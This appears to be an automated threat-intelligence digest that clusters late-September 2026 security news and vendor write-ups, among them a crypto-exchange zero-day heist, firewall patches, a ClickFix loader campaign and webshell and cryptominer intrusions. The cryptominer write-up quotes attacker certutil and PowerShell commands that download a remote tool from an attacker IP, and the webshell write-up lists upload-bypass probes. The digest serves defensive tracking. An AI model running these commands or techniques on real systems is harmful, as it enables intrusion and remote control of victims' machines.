for Agents OpenAI hacked Australian Medicare govt site, probed data providers
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: DIVD says Zammad zero-days enabled AI-driven network breach
  - Published: 2026-09-30T19:49:15+00:00
  - Link: https://www.bleepingcomputer.com/news/security/divd-says-zammad-zero-days-enabled-ai-driven-network-breach/
  - Summary: The Dutch Institute for Vulnerability Disclosure (DIVD) says that the breach of its network was possible by exploiting a chain of two zero-day vulnerabilities in the open-source Zammad ticketing system. [...]

### Cluster 50fb696318 — score 9

- Title: Bitget hacked via zero-day in third-party security products
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-09-30T11:11:46+00:00
- Link: https://www.bleepingcomputer.com/news/security/bitget-hacked-via-zero-day-in-third-party-security-products/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, web_shell_backdoor, zero_day
- affected_industries: financial_services
- affected_products: Google Cloud
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, data_breach, web_shell_backdoor
- affected_industries: financial_services
- affected_products: Google Cloud
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Cryptocurrency exchange Bitget revealed today that attackers who stole $387.5 million last week breached its systems after exploiting a zero-day flaw in third-party security products. [...]
```

#### Full body

```
Bitget hacked via zero-day in third-party security products By Sergiu Gatlan September 30, 2026 07:11 AM 0 Cryptocurrency exchange Bitget revealed today that attackers who stole $387.5 million last week breached its systems after exploiting a zero-day flaw in third-party security products. According to Bitget , two separate investigations by blockchain security firm SlowMist and Google Cloud's cyber-defense arm Mandiant said the threat actors accessed Bitget's wallet environment after compromising two security appliances with zero-day exploits. After the breach, the attackers dropped web shells on one of the hacked appliances and malware on the crypto exchange's production wallet job server, as well as a custom withdrawal tool used to launch the cryptocurrency theft after midnight on September 25. "The earliest malicious activity identified in the available logs dates to August 31. A service running on one of Product A's nodes was affected by a zero-day vulnerability. The attacker ran a hidden script under the service process, launched a command to read the environment variable containing the database password, and connected to the database. Similar hidden-script activity was observed on two other nodes on September 23 and September 25," SlowMist said . "Forensic findings indicate that on September 24, 2026, a threat actor gained unauthorised privileged access to Bitget's third party security appliances A and B. The threat actor deployed a web shell onto the security appliance B and established a Command-and-Control (C2) connection. Using the persistent access on security appliance B, the threat actor moved laterally to Bitget's production wallet job server and deployed malicious packages," Mandiant added . SlowMist added that the earliest crypto theft transfer occurred on September 02:31 (UTC+8) and the last took place at 05:23, with the attack spanning nearly 3 hours across multiple blockchains. Bitget suspended all withdrawals on Thursday after detecting multiple unauthorized transfers from its hot and warm crypto wallets and discovering that attackers had stolen $387.5 million from them. CEO Gracy Chen noted the incident affected multiple assets, including ETH, XRP, BNB, AVAX, USDT, USDC, and other tokens, and involved the Ethereum, XRP Ledger, Arbitrum, Avalanche, Optimism, BSC, and Base chains. Chen also blamed the attack on North Korean hackers, citing IP behavior patterns and on-chain analysis as evidence, and added that they breached a critical backend system within Bitget's wallet infrastructure that was later used to spoof transaction data, triggering the exchange's authorization process to move funds out of compromised hot/warm wallets. North Korean hackers have been behind many other major crypto heists, including the Bybit hack , in which they stole $1.5 billion from the crypto exchange's ETH cold wallet. Since the breach, Bitget has launched a Recovery Bounty Program that offers bounties of 5% to those who help recover or freeze funds stolen in the attack. A Bitget spokesperson was not immediately available when BleepingComputer contacted them earlier today for more information on the zero-day flaw and the third-party security products compromised in the attack. Build your security blueprint for AI-powered attacks Join Mikko Hyppönen and security leaders from the NFL, CHANEL, and Atlassian for a two-hour digital summit on what AI-speed attacks change, what defenders should stop doing, and how to validate, decide, fix, and re-validate at machine speed. Save your seat Related Articles: Bitget resumes Bitcoin withdrawals after $387.5 million crypto heist Hackers steal $351.6 million in Bitget crypto exchange hack California man admits to laundering crypto stolen in $230M heist North Korean WaterPlum hackers infected 30,000 devices worldwide French tax authority data breach affects 678,000 individuals
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Bitget hacked via zero-day in third-party security products
  - Published: 2026-09-30T11:11:46+00:00
  - Link: https://www.bleepingcomputer.com/news/security/bitget-hacked-via-zero-day-in-third-party-security-products/
  - Summary: Cryptocurrency exchange Bitget revealed today that attackers who stole $387.5 million last week breached its systems after exploiting a zero-day flaw in third-party security products. [...]

### Cluster 94f37acfe0 — score 9

- Title: WatchGuard Patches Critical Fireware OS Code Injection Vulnerability
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-30T13:16:56+00:00
- Link: https://www.securityweek.com/watchguard-patches-critical-fireware-os-code-injection-vulnerability/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, ddos, zero_day
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government
- affected_products: Anthropic/Claude, Google/Gemini, Salesforce
- cve_ids: CVE-2026-101891, CVE-2026-86102, CVE-2026-86131
- urgency_signals: actively_exploited, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, ddos, apt_espionage, active_exploitation
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government
- affected_products: Salesforce, Anthropic/Claude, Google/Gemini
- cve_ids: CVE-2026-86131, CVE-2026-101891, CVE-2026-86102
- urgency_signals: actively_exploited, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
WatchGuard has rolled out patches for 15 code execution, DoS, authorization, and path traversal bugs in Fireware OS. The post WatchGuard Patches Critical Fireware OS Code Injection Vulnerability appeared first on SecurityWeek .
```

#### Full body

```
WatchGuard on Tuesday announced fixes for 15 vulnerabilities in Fireware OS, including a critical-severity remote code execution (RCE) bug. Tracked as CVE-2026-86131 (CVSS score of 9.2), the flaw is described as a code injection issue in how the operating system handles BOVPN over TLS client configurations. Successful exploitation could allow a remote attacker who controls the remote VPN server to execute commands with root privileges on the connecting Firebox appliance. The security weakness was resolved in Fireware OS versions 2026.3.2, 2026.2.3, 12.12.3, and 12.5.21. The security updates also resolve 13 high-severity vulnerabilities that could lead to RCE, authorization bypass, denial-of-service (DoS), unauthorized SSLVPN access, and arbitrary local file reads. A medium-severity improper authorization issue leading to unauthorized access to web applications was also addressed. Advertisement. Scroll to continue reading. Several of these security defects could be exploited by remote attackers without authentication. The Fireware OS patches landed one day after WatchGuard rolled out fixes for two critical- and one high-severity Access Point flaws. Tracked as CVE-2026-101891 and CVE-2026-86102 and affecting internal API services, the critical issues could be exploited to obtain a valid API session without authentication and execute arbitrary shell commands on the underlying OS. The high-severity weakness is an OS command injection that requires administrative privileges for exploitation. All three vulnerabilities were resolved in WatchGuard AP version 3.4.8. According to WatchGuard, it is not aware of any of these security issues being exploited in the wild. Additional information can be found on the company’s security advisories page. Related: Chrome, Firefox Updates Patch Over 100 Vulnerabilities Related: Google Warns of ShinyHunters’ Fresh Oracle PeopleSoft Campaign Related: Citrix Confirms 2 NetScaler Zero-Days After Admins Pulled the Plug Related: ‘SalesBleed’ Flaws in Salesforce Agentforce Enabled Zero-Click Data Exfiltration Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire ShinyHunters Defiant After FBI Calls on Members to Come Forward Reco Raises $55 Million for Agentic Security Hackers Use ChatGPT Custom GPTs in ClickFix Attacks Dutch Police Arrest Convicted Hacker in ShinyHunters Investigation Daemon Tools Hackers’ NeedyMantis Malware Dissected by Microsoft Prison Sentence for Former US Soldier Who Hacked AT&T and Verizon DC Health Agency Exposes 400,000 Beneficiary Records Google Warns of ShinyHunters’ Fresh Oracle PeopleSoft Campaign Latest News Cisco Patches Exploited Catalyst SD-WAN Zero-Day Vulnerability Google Launches Gemini 4 Argon With Guardrail-Free Access for Vetted Defenders FTC is Investigating OpenAI and Anthropic Over Possible Risks to Consumers Google: AI Is Changing the Pace and Profile of Vulnerability Discovery Government, Finance Orgs Targeted in Weeks-Long NetScaler Zero-Day Attacks Chrome, Firefox Updates Patch Over 100 Vulnerabilities Anthropic Flags AI Agent Liability Risks as OpenAI Faces Hacking Lawsuit Russian APT Star Blizzard Uses ‘RedFlick’ Infection Chain in Recent Attacks Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts. Webinar: Securing AI Agents, MCPs, and AI Automations October 7, 2026 Learn how to address potential risks and not restrict AI adoption in your organization. See what a centralized AI gateway is and how it works in practice. Register Virtual Event: Zero Trust & Identity Strategies Summit 2026 October 14, 2026 Join as we decipher the world of zero trust and share war stories on securing an organization by eliminating implicit
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: WatchGuard Patches Critical Fireware OS Code Injection Vulnerability
  - Published: 2026-09-30T13:16:56+00:00
  - Link: https://www.securityweek.com/watchguard-patches-critical-fireware-os-code-injection-vulnerability/
  - Summary: WatchGuard has rolled out patches for 15 code execution, DoS, authorization, and path traversal bugs in Fireware OS. The post WatchGuard Patches Critical Fireware OS Code Injection Vulnerability appeared first on SecurityWeek .

### Cluster bd76ce6fac — score 9

- Title: CVE-2026-32740: RCE in a PIE Next.js sharp/libheif Stack
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-09-28T10:03:49+00:00
- Link: https://www.reddit.com/r/netsec/comments/1wsajyx/cve202632740_rce_in_a_pie_nextjs_sharplibheif/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-32740

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-32740
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- cve_ids: CVE-2026-32740
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/adrian_rt [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: CVE-2026-32740: RCE in a PIE Next.js sharp/libheif Stack
  - Published: 2026-09-28T10:03:49+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1wsajyx/cve202632740_rce_in_a_pie_nextjs_sharplibheif/
  - Summary: submitted by /u/adrian_rt [link] [comments]

### Cluster aee89b0f66 — score 8

- Title: TerminalFix and Lorem Ipsum Loader enable covert tunneling
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-09-30T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/terminalfix-and-lorem-ipsum-loader-enable-covert-tunneling
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The activity is linked to a broader campaign that previously used a different delivery mechanism Categories: Threat Research Tags: TerminalFix, clickfix, Lorem Ipsum Loader
```

#### Full body

```
TerminalFix and Lorem Ipsum Loader enable covert tunneling The activity is linked to a broader campaign that previously used a different delivery mechanism Written by Jordon Olness , Morgan Demboski Threat Research TerminalFix clickfix Lorem Ipsum Loader Share This Link Copied In August 2026, Sophos analysts began investigating a series of Managed Detection and Response (MDR) cases that involved ClickFix-style lures and resulted in the deployment of a Python-based tunneling implant. Instead of a typical ClickFix lure that instructs victims to open the Run dialog box, these lures direct users to open a Windows Terminal window. This ClickFix variation is known as ‘TerminalFix’. TerminalFix is not linked to a specific threat group or a single campaign. In 2026, Sophos analysts have observed several malicious campaigns that incorporated these lures (see Figure 1) and resulted in multiple infection chains. Figure 1: TerminalFix lures While investigating this activity, Sophos analysts identified the deployment of Lorem Ipsum Loader, a shellcode-based loader first observed by BlueVoyant in February 2026. The presence of this malware, combined with the command and control (C2) infrastructure, persistence techniques, and DLL sideloading activity, enabled Sophos analysts to link the TerminalFix intrusions to a broader campaign that has been active since at least March. Sophos analysts track this campaign as STAC4924. STAC4924 infection chain By following the instructions in the TerminalFix lure, victims execute a PowerShell command that downloads a ZIP archive containing a legitimate Windows executable, a malicious DLL, and a batch script (see Figure 2). Figure 2: Contents of the downloaded ZIP archive The command then executes the batch script, which installs several persistence mechanisms and launches the legitimate LockScreenContentServer.exe binary. The executable loads the malicious dui70.dll file via DLL sideloading. This DLL contains and executes Lorem Ipsum Loader. This loader attempts to evade entropy-based detections by storing shellcode bytes as English words rather than raw binary data. A separate lookup table provides a mapping between those words and the hexadecimal byte values they represent. Once executed, Lorem Ipsum Loader issues an HTTP request to an attacker-controlled profile hosted on the legitimate Letsdiskuss platform. The loader extracts an encoded string embedded within the profile and decodes it to retrieve the current set of C2 servers. The loader then communicates with the C2 servers using HTTP POST requests that appear to contain JPEG image files (see Figure 3). However, the image files contain encoded data that the malware extracts and decodes to facilitate C2 communications.; Figure 3: Sample image passed between the malware and C2 server The malware then executes a series of PowerShell commands to conduct reconnaissance, gather information, and establish persistence. It deploys a portable Python runtime to the Users\Public\indigo directory by downloading the legitimate Python embedded package from python.org and extracting it alongside malicious files. The runtime is then used to execute client.py, a custom tunneling implant that establishes an encrypted WebSocket connection to attacker-controlled servers and assigns a unique UUID to identify the compromised host. The resulting tunnel enables the threat actors to relay traffic through the compromised host and access network resources while blending in with legitimate web traffic. Two phases, two delivery mechanisms Analysis of the STAC4924 campaign revealed two distinct phases of activity that employ different delivery mechanisms but share many technical characteristics. The first phase, observed in March and April, relied on SEO-poisoned websites distributing trojanized Microsoft Teams MSI installers. These installers deployed a multi-stage PowerShell loader that communicated with victim-specific C2 infrastructure and leveraged attacker-controlled profi
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: TerminalFix and Lorem Ipsum Loader enable covert tunneling
  - Published: 2026-09-30T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/terminalfix-and-lorem-ipsum-loader-enable-covert-tunneling
  - Summary: The activity is linked to a broader campaign that previously used a different delivery mechanism Categories: Threat Research Tags: TerminalFix, clickfix, Lorem Ipsum Loader

### Cluster 50904175b4 — score 8

- Title: Kiteworks recommends server shutdown pending possible attack
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-09-25T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/kiteworks-recommends-server-shutdown-pending-possible-attack
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Categories: Threat Research Tags: advisory, Kiteworks
```

#### Full body

```
Kiteworks recommends server shutdown pending possible attack Written by Sophos Counter Threat Unit Research Team Threat Research advisory Kiteworks Share This Link Copied On September 25, 2026, reports emerged that Kiteworks (formerly Acellion) emailed customers that law enforcement alerted them about an “imminent” cyberattack on Kiteworks systems, possibly caused by exploitation of a zero-day vulnerability. Kiteworks reportedly advised customers to shut down servers between 02:00 and 08:00 UTC on September 26, if not sooner, as a “ precautionary ” measure. Recommended actions Counter Threat Unit™ (CTU) researchers recommend that Kiteworks customers follow the guidance in the vendor’s email or contact Kiteworks directly. About the Author(s) Sophos Counter Threat Unit Research Team Sophos Counter Threat Unit™ (CTU) researchers are recognized authorities in the cybersecurity field, regularly contributing expert analysis to global media, publishing technical analyses for the security community, and presenting about emerging threats at leading security conferences. Backed by Sophos’ advanced security technologies and a broad network of intelligence contacts and partners, the CTU™ plays a critical role in identifying and tracking threat actors and analyzing anomalous activity, uncovering new attack techniques, threats, and major shifts in the threat landscape.
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: Kiteworks recommends server shutdown pending possible attack
  - Published: 2026-09-25T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/kiteworks-recommends-server-shutdown-pending-possible-attack
  - Summary: Categories: Threat Research Tags: advisory, Kiteworks

### Cluster 86d50ce475 — score 8

- Title: Determined Attacker Uploads Malicious Webshells to Parks and Rec Management Platform Servers
- Source: Huntress (detection_response_operations)
- Published: 2026-09-30T04:00:00+00:00
- Link: https://www.huntress.com/blog/parks-recreation-platform-webshell-attack
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- affected_industries: government
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- affected_industries: government
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Huntress SOC found a threat actor exploiting a file upload flaw in recreation management to breach 3 municipal servers and steal payment data.
```

#### Full body

```
Home Blog Determined Attacker Uploads Malicious Webshells to Parks and Rec Management Platform Servers Published: September 30, 2026 Determined Attacker Uploads Malicious Webshells to Parks and Rec Management Platform Servers By: Cristian Poenaru Susannah Matt Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways Huntress recently observed three web servers compromised via a vulnerability in a popular web-based recreation management software platform designed for local municipalities, parks, and recreation organizations. After multiple failed attempts, the threat actor gained access by exploiting a flaw in the platform's file upload function, then used the same technique across all three servers: register a new account, abuse the member files upload function to launch webshells, and ultimately steal payment card data. User-agent strings suggest that the threat actor is based in China. We also suspect the use of AI-generated scripts throughout the kill chain, from the large number of failed initial access probes to the final upload of PowerShell scripts with extensive comments in the provided instructions. The threat actor may have suspected that we were onto them: They changed tactics after compromising the second web server, adopting more defense evasion techniques such as renaming files and manipulating timestamps in metadata. When one of the servers was brought back into production prematurely, the threat actor returned to launch a wider attack on the platform's users by injecting a trojan within the authentication page that harvests credentials in real time. Acknowledgments : Special thanks to Olly Maxwell for his contributions to this investigation and write-up. Background On September 10, 2026, Huntress observed a threat actor compromising multiple tenants on a shared recreation management software platform using one repeatable trick: register a member account, upload a malicious file, and turn it into a webshell. The webshells were used to execute malicious activity across three web servers. Attempting to identify and extract sensitive information, they enumerated and probed the payment/secure tenant and planted disguised copies where its folders existed. The attacker adapted their tradecraft throughout all three compromises. They learned, got quieter, added anti-forensics, and then walked straight back in after a server was cleaned but not fully locked down. Below, we tell the full story of the attack in four acts, outlining the adversary's learning curve and the different techniques used. Act 1: Loud and clumsy on the first server The attacker was determined to get in, spending roughly 6 hours throwing unauthenticated exploitation technique after technique at the web server, perhaps with the help of AI-generated scripts. Attempted initial access techniques included: Brute forcing two different login pages IIS 8.3 tilde enumeration WebDAV write verbs Upload-handler parser bypasses Forced browsing The initial brute-force attempts against the admin login page, ending in /management/login.aspx , and the members' login page /info/household/login.aspx were met with HTTP result code 200 (try again) rather than 302 (redirect to management or members page). Undeterred, the attacker then attempted multiple probing techniques, including exploiting an IIS 8.3 tilde vulnerability by crafting a request containing the tilde character, such as a*~1*, to enumerate hidden files and directories. After that failed, the attacker pivoted to HTTP method manipulation, trying eight different WebDAV methods testing for improper access controls on target files. Every attempt failed except the OPTIONS method, which returned the available methods allowed by the web server. Other failed probes included modifying the webserver's Upload.ashx and FileUpload.ashx dynamic script files, appending ::$DATA to NTFS Alternative Data Streams, and attempting to bypass simple string-matching rules with case flipping. Access granted: Rec
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Determined Attacker Uploads Malicious Webshells to Parks and Rec Management Platform Servers
  - Published: 2026-09-30T04:00:00+00:00
  - Link: https://www.huntress.com/blog/parks-recreation-platform-webshell-attack
  - Summary: Huntress SOC found a threat actor exploiting a file upload flaw in recreation management to breach 3 municipal servers and steal payment data.

### Cluster bb1f0a606c — score 8

- Title: Meet Athena: Huntress' Agentic SOC Analyst
- Source: Huntress (detection_response_operations)
- Published: 2026-09-29T16:24:00+00:00
- Link: https://www.huntress.com/blog/athena-huntress-agentic-soc-analyst
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, phishing_social_eng
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng, credential_theft
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Learn how Huntress' Athena brings agentic AI to the SOC, investigating signals end-to-end while human analysts own the final call.
```

#### Full body

```
Home Blog Meet Athena, Our Agentic SOC Analyst Last Updated: September 29, 2026 Meet Athena, Our Agentic SOC Analyst By: Micah Neidhart Spencer Engleson Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways Huntress' AI-centric SOC combines the speed of agentic AI with the expertise of human analysts. Athena helps our SOC investigate threats faster, more consistently, and at scale. SOC analysts stay in the lead, contributing experience and judgment and owning the hardest, most novel cases. The emergence of AI has been a major boon for cyberattackers. They're using it to chain together tools, automate credential theft and session hijacking, generate new malware, and write convincing phishing lures. The result is more campaigns, launched faster, against organizations that were already stretched thin. Defenders still have to investigate every signal and act without delay. But more manual work isn't a realistic solution. Our Security Operations Center (SOC) lives that reality every day as they work to defend over 250,000 organizations. That's why Huntress built Athena: a powerful agentic investigation system. Athena is not a replacement for human analysts, but an AI-powered "Iron Man suit" that helps our team move faster, more consistently, and at scale. Why Athena? In Greek mythology, Athena is the goddess of wisdom, defensive warfare, and reason, representing the intellectual, tactical, and disciplined side of combat. At Huntress, Athena brings those same traits to defending our partners and customers. So what exactly is Athena? Athena is Huntress' agentic SOC system, made of over 40 specialized AI agents. It works hand-in-hand with our human analysts to investigate security signals end-to-end, the moment they appear. Rather than simply flagging that something happened, Athena works to understand what it means, pulling together relevant context, following investigative steps consistently, and reaching a verdict on whether a signal is malicious or benign. It uses the same playbooks, telemetry, insights, and guardrails our human analysts rely on. AI that actually investigates Athena is not just AI for AI's sake. We've built Athena to use AI in a way that's extremely practical and operationally useful. Here's what that looks like in practice: Bundles related signals. Instead of treating every alert as an isolated event, Athena groups related signals together so an investigation starts with the full picture, not a fragment. Gathers the right context. It automatically pulls relevant telemetry across endpoints, identities, and logs, assembling the evidence an analyst would otherwise collect by hand. Investigates with defined playbooks. Athena draws on the playbooks, tools, and investigative skills each unique case demands, applying the same rigor and guardrails every time. Reaches a verdict. It reviews the evidence and makes a malicious or benign determination or passes inconclusive results to a human analyst, so the right action can happen without delay. Generates incident reports: Produces clear, consistent incident reports that combine plain-language summaries with technical accuracy, including IoCs like file hashes, IP addresses, and affected accounts, so findings are easy to understand and act on, no matter who's reading. Escalates to expert review: When a signal is ambiguous or below the confidence threshold, Athena automatically routes it to a Huntress analyst. When confidence is high and the pattern is well understood, Athena can move an investigation forward quickly, and in vetted, high-confidence scenarios, complete it within the guardrails analysts have defined. When the situation is unclear, ambiguous, or novel, it brings in a human analyst for review. That balance is the point: Athena lets Huntress investigate at machine speed without giving up the human judgment needed for the hardest cases, like novel adversary tactics and tools. Why an investigation-focused AI analyst matters A lot of AI in cybe
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Meet Athena: Huntress' Agentic SOC Analyst
  - Published: 2026-09-29T16:24:00+00:00
  - Link: https://www.huntress.com/blog/athena-huntress-agentic-soc-analyst
  - Summary: Learn how Huntress' Athena brings agentic AI to the SOC, investigating signals end-to-end while human analysts own the final call.

### Cluster 313eff8055 — score 8

- Title: The Not So Silent Miner: Threat Actor Compiles Cryptominer on the Endpoint
- Source: Huntress (detection_response_operations)
- Published: 2026-09-24T13:00:00+00:00
- Link: https://www.huntress.com/blog/threat-actor-compiles-cryptominer
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: critical_infrastructure
- affected_products: Anthropic/Claude, Microsoft Defender
- cve_ids: CVE-2024-7399, CVE-2025-4632
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_industries: critical_infrastructure
- affected_products: Microsoft Defender, Anthropic/Claude
- cve_ids: CVE-2025-4632, CVE-2024-7399
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Threat actors exploited Samsung MagicINFO to install AnyDesk, disable Defender, and compile a Monero miner directly on a victim endpoint. Learn the detection signals.
```

#### Full body

```
Home Blog The Not So Silent Miner: Threat Actor Compiles Cryptominer on the Endpoint Published: September 24, 2026 The Not So Silent Miner: Threat Actor Compiles Cryptominer on the Endpoint By: Harlan Carvey Lindsey O'Donnell-Welch Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways Huntress recently observed a threat actor doing something unique post-compromise: instead of simply dropping a miner, they compiled one directly on the victim endpoint, tailoring the payload while generating unusually conspicuous EDR telemetry. The incident started with exploitation of a known Samsung MagicINFO flaw. Attackers then deployed a rogue AnyDesk instance (after three tries), created a new local admin account, and disabled Defender protections. While the miner compilation aspect of this attack is interesting, the incident shows why defenders should look beyond known miner binaries: repeated RMM downloads and unexpected compiler activity can reveal a compromise before the final payload runs. Background Huntress researchers recently came across a unique incident where, after gaining initial access via exploiting a known Samsung MagicINFO vulnerability and installing a rogue AnyDesk instance on the endpoint, among other things, the threat actor aimed to deploy a cryptominer. Cryptominers in incidents aren't uncommon, but what raised our eyebrows was that the actor in this incident compiled the cryptominer directly on the endpoint. They ran commands via Silent XMR Miner Builder.exe (a Windows builder for deploying a Monero, or XMR, cryptominer, commonly associated with the open-source SilentXMRMiner project) that executed several .NET Framework utilities and an array of C compilers. Compiling a cryptominer in this way on a victim's endpoint could have various advantages for a threat actor, including allowing them to customize based on the target environment (such as optimizing for the endpoint's CPU architecture). However, these processes also resulted in a significant spike in activity and was – ironically – quite noisy from an EDR telemetry perspective. The Incident Initial Access Early in September 2026, a managed endpoint was alerted for activity that originated from the Samsung MagicINFO Premium installation on the endpoint. Samsung MagicINFO is digital signage/content management software; Huntress has previously detailed post-exploitation activities for vulnerabilities that have been found in this platform. In this incident, the activity was reportedly associated with CVE-2025-4632 , a Samsung MagicINFO vulnerability enabling attackers to write an arbitrary file as system authority. This vulnerability was fixed in May 2025 (after an initial, earlier flaw CVE-2024-7399 was found to have an incomplete fix). In reporting the incident, the customer was informed of appropriate remediation actions. However, eight days later, the endpoint was again reported for different post-compromise activity, which was tied to the same access vector as the previous incident report. (Multiple) AnyDesk Install Attempts The initial detections were for attempts to download the AnyDesk RMM to the endpoint. It took the threat actor three times to download AnyDesk from 194.87.89[.]30 . At first, they tried to use certutil.exe : C:\Windows\System32\cmd.exe /c certutil -urlcache -split -f http://194.87.89.30:8899/anydesk.exe C:\ProgramData\AnyDesk.exe 2>&1 However, this command was quickly removed by Microsoft Defender on the endpoint. The threat actor then tried to use a method involving PowerShell Invoke-WebRequest : C:\Windows\System32\cmd.exe /c powershell -c Invoke-WebRequest -Uri ""http://194.87.89.30:8899/anydesk.exe"" -OutFile ""C:\ProgramData\AnyDesk.exe"" 2>& This was again detected and remediated by Microsoft Defender. Figure 1 illustrates the EDR detection for the actor's third attempt, which finally worked. Figure 1: Detection of AnyDesk being downloaded Notice the grandparent process tomcat9.exe here. That shows that the comm
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: The Not So Silent Miner: Threat Actor Compiles Cryptominer on the Endpoint
  - Published: 2026-09-24T13:00:00+00:00
  - Link: https://www.huntress.com/blog/threat-actor-compiles-cryptominer
  - Summary: Threat actors exploited Samsung MagicINFO to install AnyDesk, disable Defender, and compile a Monero miner directly on a victim endpoint. Learn the detection signals.

### Cluster 90b084cdf5 — score 8

- Title: AI adoption is a security survival metric
- Source: Sysdig (detection_response_operations)
- Published: 2026-09-25T00:00:00+00:00
- Link: https://webflow.sysdig.com/blog/ai-adoption-is-a-security-survival-metric
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: retail_ecommerce
- affected_products: OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_industries: retail_ecommerce
- affected_products: OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
AI is moving from experiment to infrastructure. Sysdig research shows more organizations building their own infrastructure, reducing the AI attack surface.
```

#### Full body

```
< back to blog AI adoption is a security survival metric Published by: Crystal Morin Sr. Cybersecurity Strategist @ linkedin Read the full report Published: September 25, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more As AI adoption grows, usage trends are shifting. AI is moving from experiment to infrastructure. The data in the Sysdig 2026 Cloud-Native Security and Usage Report shows organizations increasingly building their own infrastructure rather than relying on external services. This change reduces the AI attack surface. From consumable to infrastructure This year, we analyzed over one million more AI and ML packages than we did last year. This is a signal of AI becoming a permanent part of infrastructure. Translating this data point to McKinsey & Co.’s classification of AI adoption, organizations are increasingly operating as shapers and makers. That is, rather than consuming AI through hosted models like ChatGPT and Claude (takers), they are customizing those models, developing data pipelines, and integrating them into their products and workflows (shapers). Also, a few are training their own models from scratch using massive GPU capacity and vast amounts of data (makers). Analyzing those packages by type, we’ve observed six times more ML packages in cloud environments . Meanwhile, for AI, OpenAI packages grew 14 times, and Anthropic’s grew 40 times . Organizations are definitely using AI; that’s no question. The conversation is now about how deeply they are integrating it. Consolidation is reducing the AI attack surface As AI adoption shifts from external services to owned infrastructure, security benefits. Paradoxically, while AI adoption is growing, the attack surface for AI infrastructure is shrinking. Organizations that create their own AI infrastructure are replacing an endless sprawl of AI-enabled point tools and APIs with fewer, yet more critical 